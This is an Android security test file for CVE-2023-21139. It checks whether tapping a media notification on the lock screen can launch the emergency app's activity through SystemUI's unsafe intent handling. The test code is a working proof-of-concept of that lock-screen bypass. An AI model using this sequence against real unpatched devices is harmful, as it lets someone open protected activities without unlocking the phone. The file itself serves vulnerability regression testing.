/*
 * Copyright (C) 2023 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts;

import static androidx.test.InstrumentationRegistry.getInstrumentation;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import android.app.Instrumentation;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.drawable.Icon;
import android.media.session.MediaSession;
import android.platform.test.annotations.AsbSecurityTest;
import android.support.test.uiautomator.By;
import android.support.test.uiautomator.UiDevice;
import android.support.test.uiautomator.Until;
import android.view.KeyEvent;

import androidx.test.runner.AndroidJUnit4;

import com.android.sts.common.LockSettingsUtil;
import com.android.sts.common.util.StsExtraBusinessLogicTestCase;

import org.junit.Test;
import org.junit.runner.RunWith;

@RunWith(AndroidJUnit4.class)
public class CVE_2023_21139 extends StsExtraBusinessLogicTestCase {
    private static final long TIMEOUT_MS = 5000;

    @AsbSecurityTest(cveBugId = 271845008)
    @Test
    public void testPocCVE_2023_21139() {
        try {
            Instrumentation instrumentation = getInstrumentation();
            Context context = instrumentation.getContext();

            // Create the notification channel
            NotificationManager notificationManager =
                    context.getSystemService(NotificationManager.class);
            UiDevice device = UiDevice.getInstance(instrumentation);
            String channelId = "CVE_2023_21139_id";
            NotificationChannel notificationChannel =
                    new NotificationChannel(
                            channelId, "CVE_2023_21139_name", NotificationManager.IMPORTANCE_HIGH);
            notificationManager.createNotificationChannel(notificationChannel);

            String vulPkgName = "com.android.emergency";
            Intent intent =
                    new Intent()
                            .setComponent(
                                    ComponentName.createRelative(
                                            vulPkgName, ".action.EmergencyActionActivity"));
            PendingIntent pendingIntent =
                    PendingIntent.getActivity(
                            context, 1 /* request code */, intent, PendingIntent.FLAG_IMMUTABLE);

            final int dimension = 100;
            Bitmap testBitmap = Bitmap.createBitmap(dimension, dimension, Bitmap.Config.ARGB_8888);

            MediaSession session = new MediaSession(context, "CVE_2023_21139_media");
            String notificationTitle = "CVE_2023_21139_notif_title";

            // Create and send the notification
            Notification notification =
                    new Notification.Builder(context, channelId)
                            .setSmallIcon(Icon.createWithBitmap(testBitmap))
                            .setContentTitle(notificationTitle)
                            .setStyle(
                                    new Notification.MediaStyle()
                                            .setMediaSession(session.getSessionToken()))
                            .setContentIntent(pendingIntent)
                            .build();
            notificationManager.notify(1 /* notification id */, notification);

            try (AutoCloseable withLockScreenCloseable =
                    new LockSettingsUtil(context).withLockScreen()) {

                // Sleep and wakeup the device to lock it
                device.pressKeyCode(KeyEvent.KEYCODE_SLEEP);
                device.pressKeyCode(KeyEvent.KEYCODE_WAKEUP);

                // Click on the notification text
                assume().withMessage(
                                String.format(
                                        "UI object with text = %s not found!", notificationTitle))
                        .that(device.wait(Until.hasObject(By.text(notificationTitle)), TIMEOUT_MS))
                        .isTrue();
                device.findObject(By.text(notificationTitle)).click();

                // Wait for the target activity to appear. On vulnerable device, the activity
                // will be started successfully.
                assertWithMessage(
                                "Vulnerable to b/271845008 !! It is possible to launch any"
                                    + " arbitrary activity under SystemUI due to unsafe intent")
                        .that(device.wait(Until.hasObject(By.pkg(vulPkgName)), TIMEOUT_MS))
                        .isFalse();
            }
        } catch (Exception e) {
            assume().that(e).isNull();
        }
    }
}
